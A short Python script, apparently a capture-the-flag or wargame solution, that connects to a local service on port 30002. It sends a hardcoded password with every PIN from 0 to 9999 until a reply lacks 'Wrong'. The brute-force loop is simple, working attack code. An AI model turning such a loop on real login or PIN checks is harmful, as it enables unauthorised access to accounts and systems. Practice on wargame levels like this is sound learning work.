#!/usr/bin/python3

import time
import socket

HOST = 'localhost'
PORT = 30002
pwd = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'
msg = pwd + ' ' + str(1)
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    data = s.recv(2024)
    string = repr(data)
    print('Received: {}'.format(string))
    print()

    for i in range(0, 10000):

        msg = pwd + ' ' + str(i)+'\n'
        s.send(msg.encode())
        print('Sending...{}'.format(msg.encode()))
        data = s.recv(2024)
        string = repr(data)
        #print('Received: {}'.format(string))
        if (string.find('Wrong') != -1):
            continue
        else:
            print('\nFound the pin!')
            print(i)
            break
    s.close()
